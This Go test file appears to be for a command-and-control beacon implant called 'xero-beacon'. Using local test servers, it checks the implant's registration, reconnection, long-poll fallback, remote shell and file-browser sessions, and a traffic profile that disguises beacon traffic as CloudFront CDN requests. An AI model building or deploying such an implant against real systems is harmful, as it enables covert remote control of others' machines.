package beacon

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/gorilla/websocket"
	"xero-beacon/internal/config"
	"xero-beacon/internal/state"
	xeroprotocol "xero-protocol"
)

func testAgentConfig(t *testing.T, c2URL string, c2PublicKey []byte) config.Config {
	t.Helper()
	return config.Config{
		C2URL:                  c2URL,
		C2PublicKeyB64:         base64.StdEncoding.EncodeToString(c2PublicKey),
		Hostname:               "test-host",
		MachineFingerprintHash: "test-fingerprint",
		OS:                     "Windows 11",
		Architecture:           "amd64",
		InternalIP:             "10.0.0.10",
		PID:                    4242,
		StatePath:              filepath.Join(t.TempDir(), "state.json"),
		UserAgent:              "xero-go-beacon-test",
		SleepSeconds:           1,
		Jitter:                 0,
		OutputLimitBytes:       64 * 1024,
	}
}

func testProtocolKeys(t *testing.T) ([]byte, []byte) {
	t.Helper()
	privateKey := make([]byte, 32)
	if _, err := rand.Read(privateKey); err != nil {
		t.Fatal(err)
	}
	publicKey, err := xeroprotocol.PublicKey(privateKey)
	if err != nil {
		t.Fatal(err)
	}
	return privateKey, publicKey
}

func ackFrame(t *testing.T, privateKey []byte, decoded *xeroprotocol.DecodedFrame, payload map[string]any) []byte {
	t.Helper()
	return protocolFrame(t, privateKey, decoded, "ACK", payload)
}

func protocolFrame(t *testing.T, privateKey []byte, decoded *xeroprotocol.DecodedFrame, messageType string, payload map[string]any) []byte {
	t.Helper()
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		t.Fatal(err)
	}
	frame, err := xeroprotocol.Encode(privateKey, decoded.PublicKey, messageType, payload, decoded.SessionID, nonce)
	if err != nil {
		t.Fatal(err)
	}
	return frame
}

func TestRunOnceRegistersOverWebSocketAndSavesToken(t *testing.T) {
	serverPrivate, serverPublic := testProtocolKeys(t)
	received := make(chan string, 3)
	upgrader := websocket.Upgrader{Subprotocols: []string{"xero.beacon.v1"}}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			t.Errorf("upgrade failed: %v", err)
			return
		}
		defer conn.Close()
		for range 3 {
			kind, raw, err := conn.ReadMessage()
			if err != nil {
				t.Errorf("read failed: %v", err)
				return
			}
			if kind != websocket.BinaryMessage {
				t.Errorf("expected binary frame, got %d", kind)
				return
			}
			decoded, err := xeroprotocol.Decode(raw, serverPrivate)
			if err != nil {
				t.Errorf("decode failed: %v", err)
				return
			}
			received <- decoded.MessageType
			payload := map[string]any{"task": nil}
			if decoded.MessageType == "REGISTER" {
				payload["beacon_id"] = "beacon-ws"
				payload["beacon_token"] = "token-ws"
				payload["selected_version"] = float64(1)
			}
			if err := conn.WriteMessage(websocket.BinaryMessage, ackFrame(t, serverPrivate, decoded, payload)); err != nil {
				t.Errorf("write failed: %v", err)
				return
			}
		}
	}))
	defer server.Close()

	cfg := testAgentConfig(t, server.URL, serverPublic)
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := agent.RunOnce(context.Background()); err != nil {
		t.Fatal(err)
	}

	if first, second, third := <-received, <-received, <-received; first != "REGISTER" || second != "HEARTBEAT" || third != "TASK_POLL" {
		t.Fatalf("unexpected message sequence: %s, %s, %s", first, second, third)
	}
	saved, err := state.Load(cfg.StatePath)
	if err != nil {
		t.Fatal(err)
	}
	if saved.BeaconID != "beacon-ws" || saved.BeaconToken != "token-ws" {
		t.Fatalf("unexpected saved state: %#v", saved)
	}
}

func TestRunOnceReconnectsExistingWebSocketBeacon(t *testing.T) {
	serverPrivate, serverPublic := testProtocolKeys(t)
	received := make(chan string, 2)
	authHeader := make(chan string, 1)
	queryBeaconID := make(chan string, 1)
	upgrader := websocket.Upgrader{Subprotocols: []string{"xero.beacon.v1"}}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		authHeader <- r.Header.Get("Authorization")
		queryBeaconID <- r.URL.Query().Get("beacon_id")
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			t.Errorf("upgrade failed: %v", err)
			return
		}
		defer conn.Close()
		for range 2 {
			_, raw, err := conn.ReadMessage()
			if err != nil {
				t.Errorf("read failed: %v", err)
				return
			}
			decoded, err := xeroprotocol.Decode(raw, serverPrivate)
			if err != nil {
				t.Errorf("decode failed: %v", err)
				return
			}
			received <- decoded.MessageType
			if err := conn.WriteMessage(websocket.BinaryMessage, ackFrame(t, serverPrivate, decoded, map[string]any{"task": nil})); err != nil {
				t.Errorf("write failed: %v", err)
				return
			}
		}
	}))
	defer server.Close()

	cfg := testAgentConfig(t, server.URL, serverPublic)
	if err := state.Save(cfg.StatePath, state.RuntimeState{BeaconID: "beacon-existing", BeaconToken: "token-existing"}); err != nil {
		t.Fatal(err)
	}
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := agent.RunOnce(context.Background()); err != nil {
		t.Fatal(err)
	}

	if got := <-authHeader; got != "Bearer token-existing" {
		t.Fatalf("unexpected auth header %q", got)
	}
	if got := <-queryBeaconID; got != "beacon-existing" {
		t.Fatalf("unexpected beacon query %q", got)
	}
	if first, second := <-received, <-received; first != "HEARTBEAT" || second != "TASK_POLL" {
		t.Fatalf("unexpected reconnect sequence: %s, %s", first, second)
	}
}

func TestRunOnceHandlesSessionDataOverWebSocket(t *testing.T) {
	serverPrivate, serverPublic := testProtocolKeys(t)
	sessionID := "00000000-0000-0000-0000-000000000018"
	responsePayload := make(chan map[string]any, 1)
	upgrader := websocket.Upgrader{Subprotocols: []string{"xero.beacon.v1"}}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			t.Errorf("upgrade failed: %v", err)
			return
		}
		defer conn.Close()
		var lastDecoded *xeroprotocol.DecodedFrame
		for range 2 {
			_, raw, err := conn.ReadMessage()
			if err != nil {
				t.Errorf("read failed: %v", err)
				return
			}
			decoded, err := xeroprotocol.Decode(raw, serverPrivate)
			if err != nil {
				t.Errorf("decode failed: %v", err)
				return
			}
			lastDecoded = decoded
			if err := conn.WriteMessage(websocket.BinaryMessage, ackFrame(t, serverPrivate, decoded, map[string]any{"task": nil})); err != nil {
				t.Errorf("write ack failed: %v", err)
				return
			}
		}
		payload := map[string]any{"session_id": sessionID, "op": "open", "shell_type": "unsupported-shell", "rows": float64(24), "cols": float64(80)}
		if err := conn.WriteMessage(websocket.BinaryMessage, protocolFrame(t, serverPrivate, lastDecoded, "SESSION_DATA", payload)); err != nil {
			t.Errorf("write session data failed: %v", err)
			return
		}
		_, raw, err := conn.ReadMessage()
		if err != nil {
			t.Errorf("read session response failed: %v", err)
			return
		}
		decoded, err := xeroprotocol.Decode(raw, serverPrivate)
		if err != nil {
			t.Errorf("decode session response failed: %v", err)
			return
		}
		if decoded.MessageType != "SESSION_DATA" {
			t.Errorf("expected SESSION_DATA response, got %s", decoded.MessageType)
			return
		}
		responsePayload <- decoded.Payload
	}))
	defer server.Close()

	cfg := testAgentConfig(t, server.URL, serverPublic)
	if err := state.Save(cfg.StatePath, state.RuntimeState{BeaconID: "beacon-existing", BeaconToken: "token-existing"}); err != nil {
		t.Fatal(err)
	}
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := agent.RunOnce(context.Background()); err != nil {
		t.Fatal(err)
	}

	payload := <-responsePayload
	if payload["session_id"] != sessionID || payload["op"] != "error" {
		t.Fatalf("unexpected session response payload: %#v", payload)
	}
}

func TestRunOnceHandlesFileBrowserSessionDataOverWebSocket(t *testing.T) {
	serverPrivate, serverPublic := testProtocolKeys(t)
	sessionID := "00000000-0000-0000-0000-000000000019"
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "notes.txt"), []byte("hello from file browser"), 0o644); err != nil {
		t.Fatalf("write fixture: %v", err)
	}
	responsePayloads := make(chan map[string]any, 2)
	upgrader := websocket.Upgrader{Subprotocols: []string{"xero.beacon.v1"}}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			t.Errorf("upgrade failed: %v", err)
			return
		}
		defer conn.Close()
		var lastDecoded *xeroprotocol.DecodedFrame
		for range 2 {
			_, raw, err := conn.ReadMessage()
			if err != nil {
				t.Errorf("read failed: %v", err)
				return
			}
			decoded, err := xeroprotocol.Decode(raw, serverPrivate)
			if err != nil {
				t.Errorf("decode failed: %v", err)
				return
			}
			lastDecoded = decoded
			if err := conn.WriteMessage(websocket.BinaryMessage, ackFrame(t, serverPrivate, decoded, map[string]any{"task": nil})); err != nil {
				t.Errorf("write ack failed: %v", err)
				return
			}
		}
		openPayload := map[string]any{"session_id": sessionID, "op": "open", "session_type": "file_browser", "root_path": root}
		if err := conn.WriteMessage(websocket.BinaryMessage, protocolFrame(t, serverPrivate, lastDecoded, "SESSION_DATA", openPayload)); err != nil {
			t.Errorf("write open failed: %v", err)
			return
		}
		_, raw, err := conn.ReadMessage()
		if err != nil {
			t.Errorf("read open response failed: %v", err)
			return
		}
		decoded, err := xeroprotocol.Decode(raw, serverPrivate)
		if err != nil {
			t.Errorf("decode open response failed: %v", err)
			return
		}
		responsePayloads <- decoded.Payload

		listPayload := map[string]any{"session_id": sessionID, "op": "list_dir", "session_type": "file_browser", "request_id": "seq-1", "path": ""}
		if err := conn.WriteMessage(websocket.BinaryMessage, protocolFrame(t, serverPrivate, lastDecoded, "SESSION_DATA", listPayload)); err != nil {
			t.Errorf("write list failed: %v", err)
			return
		}
		_, raw, err = conn.ReadMessage()
		if err != nil {
			t.Errorf("read list response failed: %v", err)
			return
		}
		decoded, err = xeroprotocol.Decode(raw, serverPrivate)
		if err != nil {
			t.Errorf("decode list response failed: %v", err)
			return
		}
		responsePayloads <- decoded.Payload
	}))
	defer server.Close()

	cfg := testAgentConfig(t, server.URL, serverPublic)
	if err := state.Save(cfg.StatePath, state.RuntimeState{BeaconID: "beacon-existing", BeaconToken: "token-existing"}); err != nil {
		t.Fatal(err)
	}
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := agent.RunOnce(context.Background()); err != nil {
		t.Fatal(err)
	}

	opened := <-responsePayloads
	listed := <-responsePayloads
	if opened["op"] != "open_ack" || opened["session_type"] != "file_browser" {
		t.Fatalf("unexpected open response: %#v", opened)
	}
	if listed["op"] != "list_dir" || listed["request_id"] != "seq-1" || listed["ok"] != true {
		t.Fatalf("unexpected list response: %#v", listed)
	}
	entries, ok := listed["entries"].([]any)
	if !ok || len(entries) != 1 {
		t.Fatalf("expected one file entry, got %#v", listed["entries"])
	}
}

func TestRunOnceFallsBackToLongPollAfterWebSocketFailure(t *testing.T) {
	serverPrivate, serverPublic := testProtocolKeys(t)
	frameTypes := make(chan string, 1)
	pollSeen := make(chan bool, 1)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/ws/beacon":
			http.Error(w, "websocket unavailable", http.StatusServiceUnavailable)
		case r.Method == http.MethodPost && r.URL.Path == "/api/v1/beacons/beacon-existing/frame":
			if r.Header.Get("Authorization") != "Bearer token-existing" {
				t.Errorf("unexpected frame auth header %q", r.Header.Get("Authorization"))
			}
			raw, err := io.ReadAll(r.Body)
			if err != nil {
				t.Errorf("read body failed: %v", err)
				return
			}
			decoded, err := xeroprotocol.Decode(raw, serverPrivate)
			if err != nil {
				t.Errorf("decode frame failed: %v", err)
				return
			}
			frameTypes <- decoded.MessageType
			w.WriteHeader(http.StatusOK)
		case r.Method == http.MethodGet && r.URL.Path == "/api/v1/beacons/beacon-existing/poll":
			if r.Header.Get("Authorization") != "Bearer token-existing" {
				t.Errorf("unexpected poll auth header %q", r.Header.Get("Authorization"))
			}
			pollSeen <- true
			w.WriteHeader(http.StatusNoContent)
		default:
			http.NotFound(w, r)
		}
	}))
	defer server.Close()

	cfg := testAgentConfig(t, server.URL, serverPublic)
	cfg.FallbackLongPollEnabled = true
	if err := state.Save(cfg.StatePath, state.RuntimeState{BeaconID: "beacon-existing", BeaconToken: "token-existing"}); err != nil {
		t.Fatal(err)
	}
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := agent.RunOnce(context.Background()); err != nil {
		t.Fatal(err)
	}
	if got := <-frameTypes; got != "HEARTBEAT" {
		t.Fatalf("expected heartbeat frame, got %s", got)
	}
	if !<-pollSeen {
		t.Fatal("expected long-poll request")
	}
}

func TestRunOnceColdStartLongPollCanRestRegister(t *testing.T) {
	serverPrivate, serverPublic := testProtocolKeys(t)
	registered := make(chan bool, 1)
	heartbeat := make(chan bool, 1)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodPost && r.URL.Path == "/api/v1/beacons/register":
			registered <- true
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{"beacon_id":"beacon-rest","beacon_token":"token-rest"}`))
		case r.Method == http.MethodPost && r.URL.Path == "/api/v1/beacons/beacon-rest/frame":
			raw, err := io.ReadAll(r.Body)
			if err != nil {
				t.Errorf("read body failed: %v", err)
				return
			}
			decoded, err := xeroprotocol.Decode(raw, serverPrivate)
			if err != nil {
				t.Errorf("decode frame failed: %v", err)
				return
			}
			heartbeat <- decoded.MessageType == "HEARTBEAT"
			w.WriteHeader(http.StatusOK)
		case r.Method == http.MethodGet && r.URL.Path == "/api/v1/beacons/beacon-rest/poll":
			w.WriteHeader(http.StatusNoContent)
		default:
			http.NotFound(w, r)
		}
	}))
	defer server.Close()

	cfg := testAgentConfig(t, server.URL, serverPublic)
	cfg.Transport = "long-poll"
	cfg.ColdStartRestFallback = true
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := agent.RunOnce(context.Background()); err != nil {
		t.Fatal(err)
	}
	if !<-registered {
		t.Fatal("expected REST registration")
	}
	if !<-heartbeat {
		t.Fatal("expected heartbeat frame after REST registration")
	}
	saved, err := state.Load(cfg.StatePath)
	if err != nil {
		t.Fatal(err)
	}
	if saved.BeaconID != "beacon-rest" || saved.BeaconToken != "token-rest" {
		t.Fatalf("unexpected saved state: %#v", saved)
	}
}

func TestRunOnceAppliesTrafficProfileFromRestRegister(t *testing.T) {
	serverPrivate, serverPublic := testProtocolKeys(t)
	registered := make(chan bool, 1)
	heartbeatPayloads := make(chan map[string]any, 1)
	pollSeen := make(chan bool, 1)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodPost && r.URL.Path == "/api/v1/beacons/register":
			registered <- true
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(`{
				"beacon_id": "beacon-profile",
				"beacon_token": "token-profile",
				"profile": {
					"id": "profile-one",
					"name": "CloudFront CDN",
					"template": "cloudfront",
					"current_version": 2,
					"config": {
						"sleep_seconds": 7,
						"jitter": 0.25,
						"user_agent": "Profile UA",
						"headers": {"X-Profile": "enabled"},
						"paths": {
							"frame": "/cdn-cgi/xero/{beacon_id}/frame",
							"poll": "/cdn-cgi/xero/{beacon_id}/collect",
							"register": "/cdn-cgi/xero/register",
							"websocket": "/cdn-cgi/xero/ws"
						},
						"padding": {"enabled": true, "min_bytes": 8, "max_bytes": 8}
					}
				}
			}`))
		case r.Method == http.MethodPost && r.URL.Path == "/cdn-cgi/xero/beacon-profile/frame":
			if r.Header.Get("User-Agent") != "Profile UA" {
				t.Errorf("unexpected frame user-agent %q", r.Header.Get("User-Agent"))
			}
			if r.Header.Get("X-Profile") != "enabled" {
				t.Errorf("missing profile header %q", r.Header.Get("X-Profile"))
			}
			raw, err := io.ReadAll(r.Body)
			if err != nil {
				t.Errorf("read body failed: %v", err)
				return
			}
			decoded, err := xeroprotocol.Decode(raw, serverPrivate)
			if err != nil {
				t.Errorf("decode frame failed: %v", err)
				return
			}
			heartbeatPayloads <- decoded.Payload
			w.WriteHeader(http.StatusOK)
		case r.Method == http.MethodGet && r.URL.Path == "/cdn-cgi/xero/beacon-profile/collect":
			if r.Header.Get("User-Agent") != "Profile UA" {
				t.Errorf("unexpected poll user-agent %q", r.Header.Get("User-Agent"))
			}
			if r.Header.Get("X-Profile") != "enabled" {
				t.Errorf("missing poll profile header %q", r.Header.Get("X-Profile"))
			}
			pollSeen <- true
			w.WriteHeader(http.StatusNoContent)
		default:
			http.NotFound(w, r)
		}
	}))
	defer server.Close()

	cfg := testAgentConfig(t, server.URL, serverPublic)
	cfg.Transport = "long-poll"
	cfg.ColdStartRestFallback = true
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := agent.RunOnce(context.Background()); err != nil {
		t.Fatal(err)
	}
	if !<-registered {
		t.Fatal("expected REST registration")
	}
	payload := <-heartbeatPayloads
	padding, err := base64.StdEncoding.DecodeString(stringValue(payload["traffic_padding_b64"]))
	if err != nil {
		t.Fatalf("expected encrypted payload padding: %v", err)
	}
	if len(padding) != 8 {
		t.Fatalf("expected 8 bytes of profile padding, got %d", len(padding))
	}
	if !<-pollSeen {
		t.Fatal("expected shaped long-poll request")
	}
	profile := agent.currentProfile()
	if profile.SleepSeconds != 7 || profile.Jitter != 0.25 || profile.Version != 2 {
		t.Fatalf("unexpected applied profile: %#v", profile)
	}
}

func TestRunOnceRequiresSavedIdentityForLongPollFallback(t *testing.T) {
	_, serverPublic := testProtocolKeys(t)
	cfg := testAgentConfig(t, "http://127.0.0.1:1", serverPublic)
	cfg.Transport = "long-poll"
	agent, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	err = agent.RunOnce(context.Background())
	if err == nil || err.Error() != "long-poll fallback requires a saved beacon identity" {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestSleepDurationHonorsJitterBounds(t *testing.T) {
	for range 100 {
		duration := SleepDuration(10, 0.25)
		if duration < 7500*time.Millisecond || duration > 12500*time.Millisecond {
			t.Fatalf("duration outside jitter bounds: %s", duration)
		}
	}
}

func TestSleepDurationClampsInputs(t *testing.T) {
	duration := SleepDuration(0, 5)
	if duration < 0 || duration > 2*time.Second {
		t.Fatalf("unexpected clamped duration: %s", duration)
	}
}
